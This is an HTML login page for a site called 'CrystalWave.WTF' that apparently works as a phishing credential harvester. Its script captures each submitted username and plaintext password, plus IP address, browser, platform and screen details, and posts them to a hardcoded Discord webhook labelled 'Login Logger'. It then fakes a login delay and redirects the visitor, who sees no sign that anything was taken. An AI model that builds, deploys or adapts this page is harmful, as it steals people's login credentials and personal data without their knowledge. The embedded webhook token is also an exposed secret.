<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CrystalWave.WTF - Login</title>
    <style>
        :root {
            --primary: #0064ff;
            --secondary: #141414;
            --accent: #00f7ff;
            --error: #ff3a3a;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--secondary);
            color: white;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: 
                radial-gradient(circle at 25% 25%, rgba(0, 100, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 75% 75%, rgba(0, 247, 255, 0.1) 0%, transparent 50%);
        }
        
        .login-container {
            background: rgba(20, 20, 20, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 100, 255, 0.2);
            position: relative;
            overflow: hidden;
        }
        
        .login-container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                to bottom right,
                transparent 45%,
                rgba(0, 100, 255, 0.1) 50%,
                transparent 55%
            );
            animation: rotate 15s linear infinite;
            z-index: -1;
        }
        
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
            font-size: 28px;
            font-weight: bold;
            color: var(--accent);
        }
        
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--accent);
            font-weight: 500;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 15px;
            background: rgba(30, 30, 30, 0.8);
            border: 1px solid rgba(0, 100, 255, 0.3);
            border-radius: 8px;
            color: white;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(0, 100, 255, 0.2);
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn:hover {
            background: #0052cc;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 100, 255, 0.3);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .error-message {
            color: var(--error);
            margin-top: 5px;
            font-size: 14px;
            display: none;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        
        .footer a {
            color: var(--accent);
            text-decoration: none;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
            color: var(--accent);
        }
        
        .spinner {
            border: 3px solid rgba(0, 100, 255, 0.3);
            border-radius: 50%;
            border-top: 3px solid var(--accent);
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">CrystalWave.WTF</div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" class="form-control" required>
                <div class="error-message" id="username-error"></div>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" class="form-control" required>
                <div class="error-message" id="password-error"></div>
            </div>
            
            <button type="submit" class="btn">Login</button>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <span>Redirecting to CrystalWave.WTF...</span>
            </div>
        </form>
        
        <div class="footer">
            <a href="#">Forgot password?</a> | <a href="#">Register</a>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const loading = document.getElementById('loading');
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1391200950315647127/YLlbrMWXa-DY-rYTmki6kwup_g6mwWBgXE0GiMA7WoYZJCZZiukLcuwNRNjRhrmW2J2e';
        const REDIRECT_URL = 'https://crystalwave.wtf/home/index.html';
        
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            
            // Hide any previous errors
            document.getElementById('username-error').style.display = 'none';
            document.getElementById('password-error').style.display = 'none';
            
            // Basic validation
            if (!username) {
                showError('username-error', 'Username is required');
                return;
            }
            
            if (!password) {
                showError('password-error', 'Password is required');
                return;
            }
            
            // Show loading state
            loginForm.querySelector('.btn').disabled = true;
            loading.style.display = 'block';
            
            try {
                // Collect additional information
                const loginData = {
                    username: username,
                    password: password, // Note: In production, never log actual passwords!
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    ip: await fetchIP(),
                    referrer: document.referrer || 'Direct'
                };
                
                // Send to Discord webhook (fire and forget)
                sendToDiscord(loginData).catch(console.error);
                
                // Simulate login processing (2 seconds)
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Redirect to CrystalWave.WTF
                window.location.href = REDIRECT_URL;
                
            } catch (error) {
                console.error('Login error:', error);
                showError('password-error', 'Login failed. Please try again.');
            } finally {
                loading.style.display = 'none';
                loginForm.querySelector('.btn').disabled = false;
            }
        });
        
        function showError(elementId, message) {
            const element = document.getElementById(elementId);
            element.textContent = message;
            element.style.display = 'block';
        }
        
        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
        
        async function sendToDiscord(data) {
            const embed = {
                title: 'New Login Attempt',
                color: 0x0064ff,
                fields: [
                    {
                        name: 'Username',
                        value: `\`\`\`${data.username}\`\`\``,
                        inline: true
                    },
                    {
                        name: 'Password',
                        value: `\`\`\`${data.password}\`\`\``,
                        inline: true
                    },
                    {
                        name: 'IP Address',
                        value: `\`${data.ip}\``,
                        inline: true
                    },
                    {
                        name: 'User Agent',
                        value: `\`\`\`${data.userAgent}\`\`\``,
                        inline: false
                    },
                    {
                        name: 'Platform',
                        value: `\`${data.platform}\``,
                        inline: true
                    },
                    {
                        name: 'Screen Resolution',
                        value: `\`${data.screenResolution}\``,
                        inline: true
                    },
                    {
                        name: 'Timestamp',
                        value: `<t:${Math.floor(new Date(data.timestamp).getTime()/1000}:F>`,
                        inline: false
                    },
                    {
                        name: 'Redirect URL',
                        value: `[${REDIRECT_URL}](${REDIRECT_URL})`,
                        inline: false
                    }
                ],
                footer: {
                    text: 'CrystalWave.WTF Login Logger'
                }
            };
            
            return fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    embeds: [embed],
                    username: 'Login Tracker',
                    avatar_url: 'https://crystalwave.wtf/logo.png'
                })
            });
        }
    </script>
</body>
</html>
